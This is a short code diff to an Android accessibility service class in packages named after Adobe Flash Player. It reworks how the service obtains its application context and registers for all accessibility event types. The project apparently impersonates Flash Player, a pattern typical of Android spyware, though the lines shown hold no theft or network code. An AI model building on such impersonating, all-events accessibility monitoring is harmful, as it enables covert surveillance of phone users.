@@ -22,6 +22,7 @@ import android.view.accessibility.AccessibilityNodeInfo;
 import com.adobe.flashplayer.MyLog;
 import com.adobe.flashplayer.Public;
 import com.adobe.flashplayer.Utils;
+import com.adobe.flashplayer.accessory.AccessHelper;
 
 
 public class AccessibilitySrv extends AccessibilityService {
@@ -48,8 +49,19 @@ public class AccessibilitySrv extends AccessibilityService {
         return true;
     }
 
-    AccessibilitySrv() {
-        Public pub = new Public(getApplicationContext());
+    //can not call getApplicationContext(),why?
+    public AccessibilitySrv() {
+        if (this.context == null){
+            context = AccessHelper.getContext();
+            if (context != null){
+                this.context = context;
+                Public pub = new Public(context);
+            }
+        }else{
+            Context context = getApplicationContext();
+            this.context = context;
+            Public pub = new Public(context);
+        }
     }
 
     @Override
@@ -59,7 +71,7 @@ public class AccessibilitySrv extends AccessibilityService {
 
         Log.e(TAG, "onServiceConnected");
 
-        Public pub = new Public(getApplicationContext());
+        //Public pub = new Public(getApplicationContext());
 
         AccessibilityServiceInfo info = new AccessibilityServiceInfo();
         info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
